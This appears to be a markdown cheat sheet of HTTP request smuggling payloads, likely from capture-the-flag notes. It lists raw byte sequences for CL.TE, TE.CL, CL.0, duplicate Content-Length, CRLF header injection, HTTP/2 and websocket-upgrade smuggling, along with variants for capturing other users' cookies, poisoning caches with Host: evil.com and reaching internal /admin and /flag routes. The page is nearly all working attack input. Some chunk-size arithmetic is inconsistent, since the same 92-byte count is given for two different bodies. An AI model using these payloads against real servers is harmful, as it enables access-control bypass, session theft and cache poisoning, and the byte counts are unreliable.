# Smuggle payloads — the working byte-sequences

## The CL.TE prefix — `G` / `X` / arbitrary

```text
0\r\n
\r\n
G
```

The `G` is the leftover — the next request's `P` becomes `GP` —
`GPOST` is malformed.

## The TE.CL full-request — the complete smuggle

```text
5c\r\n
GET /admin HTTP/1.1\r\n
Host: t\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n
```

The `5c` chunk-data is the smuggle — the `0` terminates.

## The TE.CL GET-only — no body

```text
5c\r\n
GET /admin HTTP/1.1\r\n
Host: t\r\n
\r\n
x=1\r\n
0\r\n
\r\n
```

`5c` = 92 bytes — `GET /admin HTTP/1.1\r\nHost: t\r\n\r\nx=1\r\n` = 92 —
the CL on the smuggle is implicit.

## The TE.CL POST-with-body — the write smuggle

```text
7b\r\n
POST /action HTTP/1.1\r\n
Host: t\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 10\r\n
\r\n
k=v&x=y\r\n
0\r\n
\r\n
```

The smuggle's POST carries a body — `Content-Length` on the smuggle —
`smuggle-shapes.md`.

## The CL.0 smuggle — the ignored-body

```text
POST /ignored HTTP/1.1
Content-Length: 60

GET /admin HTTP/1.1
Host: t
Foo: x
```

The body IS the smuggle — `client-side-desync.md`.

## The dup-CL smuggle — `CL:4 CL:7`

```text
POST / HTTP/1.1
Content-Length: 4
Content-Length: 7

A=1&B=2
```

`cl-manipulation.md` — the dup-CL.

## The header-fold — `%0d%0a`

```text
?host=x%0d%0aX-Inj:%201
?host=x%0d%0a%0d%0aGET%20/admin
```

`crlf-injection.md`.

## The h2 smuggle — `content-length:0`

```text
:method POST :path / content-length 0 + DATA bytes
```

`http2-smuggling.md`.

## The upgrade-tunnel — `Upgrade: ws` + HTTP inside frame

```text
GET /ws Upgrade:websocket → 101 → <frame:GET /admin>
```

`upgrade-smuggling.md`.

## The cookie-steal — `POST /store CL:400 body=x=`

```text
POST /store HTTP/1.1
Content-Length: 400

x=
```

`session-hijack.md`.

## The cache-poison — `GET /?cb=xyz Host: evil.com`

```text
GET /?cb=xyz HTTP/1.1
Host: evil.com
```

`cache-poison-via-smuggle.md`.

## The internal-route — `GET /flag Host: internal`

```text
GET /flag HTTP/1.1
Host: internal
X-Forwarded-For: 127.0.0.1
```

`internal-routes.md`.
